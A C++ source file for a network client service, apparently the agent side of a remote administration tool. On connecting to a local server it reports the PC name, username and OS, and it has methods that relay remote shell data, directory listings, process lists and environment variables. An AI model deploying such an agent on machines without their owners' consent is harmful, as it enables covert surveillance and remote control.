#include "NetClientService.h"
#include <boost/asio.hpp>
#include <boost/make_shared.hpp>
#include <boost/bind.hpp>
#include <boost/thread.hpp>
#include "../../../shared/NetLib/packets/PacketPresentation.h"
#include "SystemService.h"
#include "../models/system_models_defs.h"
#include "../Application.h"
#include "../../../shared/NetLib/packets/PacketFileSystem.h"
#include "../../../shared/NetLib/packets/PacketShell.h"
#include "../../../shared/NetLib/packets/PacketInformation.h"

NetClientService::NetClientService(const boost::shared_ptr<Application>& app,
                                   const boost::shared_ptr<boost::asio::io_service>& ioService)
	: BaseNetClientService(ioService), app(app)
{
}


NetClientService::~NetClientService()
{
}

boost::shared_ptr<NetClientService> NetClientService::createInstance(const boost::shared_ptr<Application>& app)
{
	return boost::make_shared<NetClientService>(app, boost::make_shared<boost::asio::io_service>());
}

void NetClientService::runAsync()
{
	const boost::asio::ip::tcp::resolver::query dns_query("127.0.0.1", "3002");
	boost::asio::ip::tcp::resolver resolver(*ioService);

	const boost::asio::ip::tcp::resolver::iterator responses = resolver.resolve(dns_query);

	boost::asio::async_connect(
		clientSocket, responses,
		boost::bind(&NetClientService::onConnection, this, boost::asio::placeholders::error));

	boost::thread netThread(boost::bind(&boost::asio::io_service::run, ioService.get()));
}

void NetClientService::onConnection(const boost::system::error_code& err)
{
	if (err)
	{
		// TODO: error handling
	}

	boost::shared_ptr<PacketPresentation> packet(new PacketPresentation);

	// SystemService::getBasicSystemInfo();

	packet->sysInfo.pcName = SystemService::getPcName();
	packet->sysInfo.username = SystemService::getUsername();
	packet->sysInfo.osName = SystemService::getOSName();
	sendPacket(packet);
	interactAsync();
}

void NetClientService::sendDirEntries(const std::wstring& path, const std::vector<FileInfo>& files)
{
	const boost::shared_ptr<PacketFileSystem> packet = boost::make_shared<PacketFileSystem>(path);
	packet->files = files;
	sendPacket(packet);
}

void NetClientService::sendShellData(const std::string& data)
{
	const boost::shared_ptr<PacketShell> packet = boost::make_shared<PacketShell>(data);
	sendPacket(packet);
}

void NetClientService::sendStopShell()
{
	const boost::shared_ptr<PacketShell> packet = boost::make_shared<PacketShell>();
	packet->action = PacketShell::PacketAction::Stop;
	sendPacket(packet);
}

void NetClientService::sendClientInformation(const std::string& pcName, const std::wstring& username,
                                             const std::string& osName,
                                             const std::map<std::string, std::string>& environment)
{
	boost::shared_ptr<PacketInformation> packet = boost::make_shared<PacketInformation>();
	packet->environment = environment;
	packet->osName = osName;
	packet->username = username;
	packet->pcName = pcName;

	sendPacket(packet);
}

void NetClientService::sendProcessList(const std::list<Process>& processes)
{
	boost::shared_ptr<PacketProcess> packet = boost::make_shared<PacketProcess>();
	packet->processes = processes;
	sendPacket(packet);
}


void NetClientService::onPacketReceived(const boost::shared_ptr<Packet>& packet)
{
	app->onPacketReceived(packet);
}
